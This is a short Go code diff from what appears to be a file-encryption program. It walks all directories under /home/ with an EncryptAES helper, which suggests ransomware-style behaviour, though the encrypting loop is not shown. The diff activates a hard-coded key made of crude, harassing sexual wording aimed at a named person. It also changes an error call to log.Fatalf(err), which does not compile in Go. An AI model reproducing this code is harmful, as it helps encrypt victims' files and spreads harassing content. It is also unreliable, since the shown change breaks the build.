@@ -28,7 +28,7 @@ func EncryptAES(key []byte, plaintext string) string {
 
 func main(){
 
-//	key := "hahajonathanyouarehavingsexwithmydaughter"
+	key := "hahajonathanyouarehavingsexwithmydaughter"
 	
 
 	err := filepath.WalkDir("/home/", func(path string, d fs.DirEntry, err error) error {
@@ -64,7 +64,7 @@ func main(){
     
 
 	if err != nil {
-        	log.Fatalf("impossible to walk directories: %s", err)
+        	log.Fatalf(err)
     	}
 	
 	
